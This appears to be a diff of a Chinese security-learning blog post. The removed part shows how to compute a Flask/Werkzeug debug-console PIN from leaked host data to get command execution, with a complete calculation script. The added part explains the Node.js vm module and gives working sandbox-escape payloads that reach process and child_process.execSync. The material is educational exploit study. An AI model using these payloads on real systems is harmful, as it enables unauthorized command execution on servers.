globalVar: 2 &#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248406.png" srcset="/img/loading.gif" lazyload alt="image-20250706134614052" style="zoom: 33%;" />
 
 
 
-<h1 id="PIN码计算"><a href="#PIN码计算" class="headerlink" title="PIN码计算"></a>PIN码计算</h1><p>对于有文件包含或文件读取的漏洞，且开启debug功能，可尝试本地构造pin码进入控制台</p>
-<p>输入pin码后即可输入命令执行   </p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure>
+<ol start="3">
+<li><code>vm.runInNewContext(code[, sandbox][, options])</code></li>
+</ol>
+<p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p>
+<p>例：<code>vm.runInNewContext(&#39;a = a + 1&#39;, &#123; a: 1 &#125;)</code></p>
+<ol start="4">
+<li><code>vm.runInThisContext(code[, options])</code></li>
+</ol>
+<p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以能访问和修改全局变量，但不会污染外部作用域（这里的“外部作用域”指的不是“全局作用域”，而是当前函数或模块的局部变量作用域）</p>
+<ul>
+<li><strong>能访问和修改全局变量</strong>（如 <code>global.foo</code>、全局对象、Node.js 内建全局）。</li>
+<li><strong>不能访问当前函数或模块里的局部变量</strong>，也不能声明变量后让外部直接访问。</li>
+</ul>
+<p>举例，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132245953.png" srcset="/img/loading.gif" lazyload alt="image-20250713002222245"></p>
-<p>可参考：</p>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000042254626">深入浅出Flask PIN - 蚁景网安实验室 - SegmentFault 思否</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/icfh/p/17607277.html">Flask PIN码分析和总结 - Icfh - 博客园</a></p>
-<p>1、<code>username</code> –&gt; 执行代码时候的用户名</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import getpass<br>username = getpass<span class="hljs-selector-class">.getuser</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(username)</span></span><br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248223.png" srcset="/img/loading.gif" lazyload alt="image-20250706134614052" style="zoom:50%;" />
 
-<p>2、<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code> –&gt; 默认为Flask</p>
-<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-title">app</span> = <span class="hljs-type">Flask</span>(__name__)<br><br><span class="hljs-title">print</span>(getattr(app, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-keyword">type</span>(app).name))<br></code></pre></td></tr></table></figure>
+<ol start="5">
+<li>vm.Script类</li>
+</ol>
+<p><code>vm.Script</code> 是 Node.js <code>vm</code> 模块中的一个类。它代表<strong>一段预编译的 JavaScript 脚本</strong>，你可以用它在不同的上下文（沙箱）中多次、高效地执行同一段代码。和 <code>eval</code> 不同，<code>vm.Script</code> 支持预编译与复用，也不绑定当前作用域。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">new</span> <span class="hljs-keyword">vm</span>.Script(code[, <span class="hljs-keyword">options</span>])<br>创建一个新的<span class="hljs-keyword">vm</span>.Script对象只编译代码但不会执行它。编译过的<span class="hljs-keyword">vm</span>.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br><br>script.runInContext(context[, <span class="hljs-keyword">options</span>])<br>    在指定的上下文（沙箱）中执行脚本。<br>    context 必须用 <span class="hljs-keyword">vm</span>.createContext() 创建。<br>    执行时，每次都用新的上下文变量。<br><br>script.runInNewContext([<span class="hljs-keyword">sandbox</span>][, <span class="hljs-keyword">options</span>])<br>    在新建的沙箱环境中执行脚本。<br>    <span class="hljs-keyword">sandbox</span> 是本次执行的上下文对象。<br><br>script.runInThisContext([<span class="hljs-keyword">options</span>]<br>    在当前全局上下文中执行脚本。<br>    代码可访问全局（<span class="hljs-keyword">global</span>）变量，但与本地作用域隔离。<br><br></code></pre></td></tr></table></figure>
 
-<p>获取的是当前app对象的<code>__name__</code>属性，若不存在则获取类的<code>__name__</code>属性，默认为Flask</p>
-<p>3、<code>modname</code> –&gt; 固定值默认flask.app</p>
-<figure class="highlight plaintext"><figcaption><span>sys</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs import">from flask import Flask<br>import typing as t<br><br>app = Flask(__name__)<br><br>modname = getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)<br>mod = sys.modules.get(modname)<br>print(mod)<br></code></pre></td></tr></table></figure>
+<p>例，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-comment">// 编译代码</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;a += 10&#x27;</span>);<br><br><span class="hljs-comment">// 创建两个上下文</span><br><span class="hljs-keyword">const</span> context1 = vm.<span class="hljs-title function_">createContext</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;);<br><span class="hljs-keyword">const</span> context2 = vm.<span class="hljs-title function_">createContext</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">100</span> &#125;);<br><br><span class="hljs-comment">// 在不同上下文多次运行</span><br>script.<span class="hljs-title function_">runInContext</span>(context1);<br>script.<span class="hljs-title function_">runInContext</span>(context2);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(context1.<span class="hljs-property">a</span>); <span class="hljs-comment">// 11</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(context2.<span class="hljs-property">a</span>); <span class="hljs-comment">// 110</span><br></code></pre></td></tr></table></figure>
 
-<p>取的是app对象的<code>__module__</code>属性，若不存在的话取类的<code>__module__</code>属性，默认为flask.app。</p>
-<p>4、<code>getattr(mod,&quot;__file__&quot;, None)</code> –&gt;app.py文件所在路径</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br><br>app = Flask(__name__)<br><br>modname = <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__module__&quot;</span>, t.cast(<span class="hljs-built_in">object</span>, app).__class__.__module__)<br>mod = sys.modules.get(modname)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248856.png" srcset="/img/loading.gif" lazyload alt="image-20250706134614052"></p>
+<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>沙箱逃逸的前提是：我们可以从沙箱内部通过属性或者方法或者其他方式访问到沙箱外部</p>
+<p>我们执行m+n这个表达式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`m+n`</span> <span class="hljs-comment">//这里就是要在沙箱中执行的脚本</span><br><span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> &#125; <span class="hljs-comment">//这里是具体执行的值</span><br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure>
 
-<p>mod的<code>__file__</code>属性，即app.py文件所在路径</p>
-<p>输出:<code>C:/Users/mcc06/Downloads/sstlabs-master/venv/lib/site-packages/flask/app.py</code></p>
-<p>5、<code>str(uuid.getnode())</code> –&gt;电脑上mac地址</p>
-<p>实际上就是当前网卡的物理地址的整型</p>
-<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">uuid</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">str</span>(<span class="hljs-title">hex</span>(<span class="hljs-variable">uuid.getnode</span>())))</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248177.png" srcset="/img/loading.gif" lazyload alt="image-20250706201546522"></p>
+<p>成功的在沙箱中执行了脚本，并且返回了执行的结果。</p>
+<p>这个环境中上下文有三个对象：</p>
+<blockquote>
+<p><code>this</code> 指向传入的 sandbox 对象。你传给 <code>vm.createContext</code> 的对象就是沙箱的“全局对象”，里面的属性（m、n）就是沙箱中的变量，而<code>this</code> 在沙箱代码中指向这个对象，你可以通过 <code>m</code>, <code>n</code>, <code>this.m</code>, <code>this.n</code> 在沙箱里访问这两个变量。</p>
+<p>m等于数字1</p>
+<p>n等于数字2</p>
+</blockquote>
+<p>一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了。在获取到process对象后，我们就可以用require来导入child_process，再利用child_process执行命令。</p>
+<p>但process挂载在global上，我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p>
+<p>我们可以使用传入的对象（比如this）来引入沙箱外部模块，从而拿到process，比如（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> vm = require(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = `<br><span class="hljs-keyword">const</span> process = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()<br>`<br><span class="hljs-keyword">const</span> sandbox = &#123; m: <span class="hljs-number">1</span>, n: <span class="hljs-number">2</span> &#125; <span class="hljs-comment">//这里是具体执行的值</span><br><span class="hljs-keyword">const</span> context = new vm.createContext(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.runInContext(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.log(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure>
 
-<p>6、<code>get_machine_id()</code> –&gt;根据操作系统不同，有四种获取方式</p>
-<p>Python flask版本不同，读取顺序也不同</p>
-<table>
-<thead>
-<tr>
-<th>操作系统&#x2F;容器</th>
-<th>位置</th>
-<th>取法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Linux</td>
-<td>&#x2F;etc&#x2F;machine-id，&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</td>
-<td>前者固定后者不固定</td>
-</tr>
-<tr>
-<td>docker</td>
-<td>&#x2F;proc&#x2F;self&#x2F;cgroup</td>
-<td>正则分割</td>
-</tr>
-<tr>
-<td>macOS</td>
-<td>ioreg -c IOPlatformExpertDevice -d 2</td>
-<td><code>&quot;serial-number&quot; = &lt;ID&gt;</code>部分</td>
-</tr>
-<tr>
-<td>windows</td>
-<td>HKEY_LOCAL_MACHINE&#x2F;SOFTWARE&#x2F;Microsoft&#x2F;Cryptography&#x2F;MachineGuid]</td>
-<td>注册表</td>
-</tr>
-</tbody></table>
-<p>然后直接用下面脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;nobody&#x27;</span>,  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.6/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 利用报错得到 app.py 的位置</span><br>]<br><br><br>private_bits = [<br>    <span class="hljs-string">&#x27;95530043904&#x27;</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address 转换为十进制，可以用下面的函数</span><br>    <span class="hljs-string">&#x27;111&#x27;</span>  <span class="hljs-comment"># machine-id 使用下面的方法获得</span><br><br>]<br><br><span class="hljs-comment"># 将/sys/class/net/eth0/address 转换为十进制</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_decimal</span>(<span class="hljs-params">mac_address: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将MAC地址（如 &#x27;00:16:3e:08:ca:00&#x27;）转换为十进制整数。</span><br><span class="hljs-string">    :param mac_address: 字符串格式的MAC地址</span><br><span class="hljs-string">    :return: 十进制整数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    hex_str = mac_address.replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    decimal = <span class="hljs-built_in">int</span>(hex_str, <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(decimal)<br><br><span class="hljs-comment"># mac = &quot;00:16:3e:08:ca:00&quot;</span><br><span class="hljs-comment"># mac_to_decimal(mac)</span><br><br><span class="hljs-comment"># 获得machine-id方法</span><br><span class="hljs-comment"># 1. Linux 系统：/etc/machine-id (docker 环境忽略)</span><br><span class="hljs-comment"># 2. docker：/proc/sys/kernel/random/boot_id 拼接 /proc/self/cgroup</span><br><span class="hljs-comment"># 在 Kubernetes/Docker 环境 下，Flask 的 machine-id 生成逻辑是：machine_id = boot_id + 容器ID。</span><br><span class="hljs-comment"># boot_id：/proc/sys/kernel/random/boot_id；容器 ID：从 /kubepods/ 开始，最后一个 / 后的部分就是容器 ID。</span><br><span class="hljs-comment"># 其余操作系统见上</span><br><br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br><br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(<br>                num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>            )<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>
+<p>那么我们是怎么实现逃逸的呢，首先我们提到过this指向的是当前传递给<code>createContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p>
+<p>下面这行代码也可以获得process对象：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> process = <span class="hljs-variable language_">this</span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>)<br></code></pre></td></tr></table></figure>
 
+<p>this.toString获取到一个函数对象，this.toString.constructor获取到函数对象的构造器，构造器中可以传入字符串类型的代码，然后再执行，即可获得process对象。</p>
+<p>那么问题就来了！</p>
+<p>1、为什么不直接使用<code>&#123;&#125;.toString.constructor(&#39;return process&#39;)()</code>，却要使用this呢？</p>
+<p>{}的意思是在沙箱内声明了一个对象。</p>
+<p>这两个的一个重要区别就是，{}是在沙盒内的一个对象，而this是在沙盒外的对象（注入进来的）。沙盒内的对象即使使用这个方法，也获取不到process，因为它本身就没有process。</p>
+<p>2、m和n也是沙盒外的对象，为什么不用<code>m.toString.constructor(&#39;return process&#39;)()</code>呢？</p>
+<p>因为数字、字符串、布尔等这些都是primitive types，他们的传递其实传递的是值而不是引用，所以在沙盒内虽然你也是使用的m，但是这个m和外部那个m已经不是一个m了，所以也是无法利用的。</p>
+<p>所以，我们将mn改成其他类型就可以利用了：<code>context：&#123;m: [], n: &#123;&#125;, x: /regexp/&#125;</code></p>
+<p>那么我们就可以总结一下沙箱绕过的核心原理：</p>
+<blockquote>
+<p> 只要在沙箱内部，找到一个沙箱外部的对象，借助这个对象内的属性即可获得沙箱外的函数，进而绕过沙箱。</p>
+</blockquote>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p><strong>方法1，利用Function构造函数沙箱逃逸，执行命令</strong></p>
+<p>利用引用类型：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">script</span> = `<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">process</span> = x.toString.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;ipconfig&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()<br>`<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sandbox</span> = &#123; m: [], n: &#123;&#125;, x: /regexp/ &#125; <span class="hljs-comment">//</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">context</span> = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_ invoke__">createContext</span>(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">res</span> = vm.<span class="hljs-title function_ invoke__">runInContext</span>(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.<span class="hljs-title function_ invoke__">log</span>(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure>
+
+<p>上面通过新建了一个 process，将通过x.tostring.constructor拿到的process模块，这时的sandbox中的数值是任意的引用类型</p>
+<p>然后通过拿到的process.mainMoudule.require方法，拿到c’child_process’子模块，然后通过exec.Sync方法执行我们的命令</p>
+<p>这样就成功的利用了沙箱逃逸实现了任意命令执行，虽然出现了乱码，但是不影响我们的命令执行</p>
+<p>利用this（这里与原理里的实例一致）： </p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> vm = require(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = <br>`<br><span class="hljs-keyword">const</span> process = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;ls&#x27;</span>).toString()<br>` <span class="hljs-comment">//这样我们就拿到了Function构造函数了，拿到了process模块，调用process子模块，然后通过调用process的方法来实现任意命令执行</span><br><span class="hljs-keyword">const</span> sandbox = &#123; m:<span class="hljs-number">1</span>, n:<span class="hljs-number">2</span> &#125; <span class="hljs-comment">//</span><br><span class="hljs-keyword">const</span> context = new vm.createContext(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.runInContext(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.log(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure>
+
+<p>与利用引用类型不同的是通过 this方法来实现的，将x换位了this，那么这时，sandbox中的值就不要求是一些类型的引用，可以是任意的数值了</p>
+<p><strong>方法2：利用argument.callee.caller实现</strong></p>
+<p>现在如果有一个这样的一个框架如下所示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>); <br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>; <br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox); <br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context); <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res) <br></code></pre></td></tr></table></figure>
+
+<p>在 JavaScript 中，this 关键字的值取决于函数的执行上下文。</p>
+<p>在全局作用域中，this 通常指向全局对象（如浏览器环境中的 window 对象，Node.js 环境中的 global 对象）。但是，在使用 Object.create(null) 创建的对象上下文中，this 将为 null。</p>
+<p><code>const sandbox = Object.create(null);</code></p>
+<p>Object.create(null) 是一个创建一个新对象的方法：</p>
